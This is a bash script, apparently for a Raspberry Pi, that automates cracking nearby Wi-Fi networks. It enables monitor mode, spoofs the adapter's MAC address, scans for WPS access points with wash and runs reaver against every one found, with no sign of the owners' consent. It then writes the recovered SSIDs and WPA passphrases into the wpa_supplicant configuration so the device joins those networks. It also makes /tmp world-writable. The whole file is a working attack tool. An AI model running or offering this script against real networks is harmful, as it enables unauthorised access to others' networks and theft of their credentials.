#!/bin/bash
#This script run scan and crack WPS using wash and reaver

#Color
 col='\033[0;33m'       # Yellow
 nc='\033[0m'       # No Color
 
# Enable monitor-mode
echo -e ${col} "Enabling monitor-mode" ${nc}

 sudo ip link set wlan1 down
 sudo iw wlan1 set monitor none
 sudo macchanger -p wlan1
 sudo ip link set wlan1 up

 sudo chmod 777 /home/pi/hs/
 sudo chmod 777 /tmp
# cd /tmp
echo "====================================================="

# WPS network list
echo -e ${col} "Scaning wps network for 30 sec" ${nc}

 sudo bash -c 'timeout 30s wash -i wlan1 > washout.txt'
 cat washout.txt
 echo "====================================================="

# Building bssid only list
echo -e ${col} "Creating bssid list" ${nc}
  sudo rm bssid.txt
  
 filename='washout.txt'
 while read -r line
 do
   id=$(cut -c-17 <<< "$line")
   echo $id  >> bssid
 done < "$filename"
 echo "====================================================="

# Remove B8:27:EB:6E:4D:2B mac of wlan0 from bssid list
 tail -n+3 bssid | sed -e 's/\<B8:27:EB:6E:4D:2B\>//g' | sed -r '/^\s*$/d' > bssid.txt
 rm bssid
 cat bssid.txt

# Cracking using reaver 
echo -e ${col} "Running reaver" ${nc}
 sudo rm wps-pwned.txt

 sudo touch /var/lib/reaver/test
 sudo rm /var/lib/reaver/*
 while IFS= read -r line; do
     sudo timeout 60s reaver -q -i wlan1 -b "$line" >> wps-pwned.txt
 done < bssid.txt

 cp wps-pwned.txt ~/hs/wps-pwned_`date +"%H:%M:%S:%d-%b-%Y"`.txt
 cat wps-pwned.txt
 cd ~/hs && md5sum  * | sort -t ' ' -k 4 -r | awk 'BEGIN{lasthash = ""} $1 == lasthash {print $2} {lasthash = $1}' | xargs rm && cd ~/
 find ~/hs -size 0 -print -delete
echo "====================================================="

# Adding cracked wifi to conf file

a=tmpfile
b=wpa_supplicant-wlan1.conf
c=/etc/wpa_supplicant
d=~/conf_bak

grep -v "WPS PIN" wps-pwned.txt > $a
sed -i 's/: /=/' $a
sed -i 's/WPA/ /' $a
sed -i 's/AP/ /' $a
sed -i 's/+//' $a
sed -i 's/PSK/psk/' $a
sed -i 's/SSID/ssid/' $a
sed -i 's/[][]//g' $a
sed -i "s/'/\"/g" $a
#awk '!seen[$0]++' $a > a1 
#mv a1  $a

sed -i 's/psk/network={ \n   psk/' $a
sed -i 's/.*ssid.*/& \n   }\n/' $a

echo "country=IN
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1" > header

cat $a >> header

mkdir -p $d
sudo cp $c/$b $d/wpa_supplicant-wlan1.conf.backup_`date +"%H:%M:%S:%d-%b-%Y"` 
sudo find $b -size 0 -print -delete
sudo cp header $c/$b
cp header $c/$b

cat $c/$b

echo -e ${col} "Cracked wifi added to configuration" ${nc}
echo "====================================================="

# Disabling monitor-mode and restore internet
echo -e ${col} "Restoring manged-mode" ${nc}
 sudo ip link set wlan1 down
 sudo iw wlan1 set type managed
 sudo ip link set wlan1 up
echo "====================================================="

echo -e ${col} "Finished!!" ${nc}

 
 sleep 5
 ping -O -c 4 1.1
 echo "====================================================="
 
 echo -e ${col} "Status of wifi connection" ${nc}
 sudo wpa_cli -i wlan1 status
 
 #sudo systemctl restart wpa_supplicant@wlan1.service
 #sudo systemctl restart wpa_supplicant@wlan0.service
 echo "====================================================="
